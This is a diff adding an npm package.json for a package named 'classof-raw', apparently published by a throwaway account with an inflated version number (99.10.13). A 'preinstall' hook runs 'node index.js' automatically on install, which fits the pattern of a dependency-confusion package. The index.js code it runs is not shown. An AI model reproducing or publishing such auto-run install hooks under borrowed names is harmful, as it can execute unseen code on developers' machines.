@@ -1,0 +1,39 @@
+{
+    "name": "classof-raw",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "classof-raw@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-q94rQMeUpJuL8Uoex3BYBiqaiy9Qz6Zdhsuy5XpZcWCsAWnszpyHMYlH1fu2Zndf0gTMxrn+LvCY8yioZ9BHlA==",
+        "shasum": "d75fe1cb2c880a37cf6f5cb1e075b34e0e20cba7",
+        "tarball": "https://registry.npmjs.org/classof-raw/-/classof-raw-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5069,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXCACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmqqqg//TKRD3pQYSFfFpZOogASUngY8z33C5qSod6iaB7/TUcqavgHK\r\n1aJWWzjmS7KM4TlvC13brITRHtxwOh8/ZTWzyPjqU4PYb/8ztfjb/4tbgC2v\r\noVEO3mfKQ7uKiA1qKXoIqDRXqP45kTRxzYjzwgDClDm0cocTi88t2f/5o+Vc\r\nc/2C7yzffUFbo2emUbahQUPXrI4OG9V8XmhHnbHkaTyQ6BqS4NYyux6fAMMH\r\n3PeMMbs+KOIALFAPF9busf8KM4cGrZSdJfLAOhYNd/ThIaqyz4xprIjiceM/\r\nUcGRrXeQRYLDCS5bYCuU1dhtsL771syPUkjuHhwMZ7WeXVuv0ugRWm4Q3Nfk\r\nKziuRYO/RCKTgVQ16j1Gsj+9B8FcggdleTmxy+BkT4BAXkeS1QNWRrrWTsGf\r\nipZRqgvX8oLMXlOsNuzWcp8suKtsGlNmduY6367cqZaHprMurTHMpDP6Qzqp\r\nS1r6QyubPpW4F7XnaIEI8rvPSID9NQ7jDyyqKPBFP1kYvue4xVaN9QqfKkUG\r\npZS59kyPwWEg+MGFIKo+kCnjTsLcgC+earbMsvlrTdqQHYtTSTKq7gNn5AU+\r\nJjLwBIgyOE+h7sIY1pcuP8HwKtdjTrqFnA2ptZhPYbsrawDVL/Wy60J1A5hn\r\n+ebQ9bPFdjwU704WuKq9DB8YAIJwRM7jq7M=\r\n=9BGz\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "gd931qhx",
+        "email": "gd931qhx@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "gd931qhx",
+            "email": "gd931qhx@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/classof-raw_99.10.13_1648420290206_0.3823858213974056"
+    },
+    "_hasShrinkwrap": false
+}
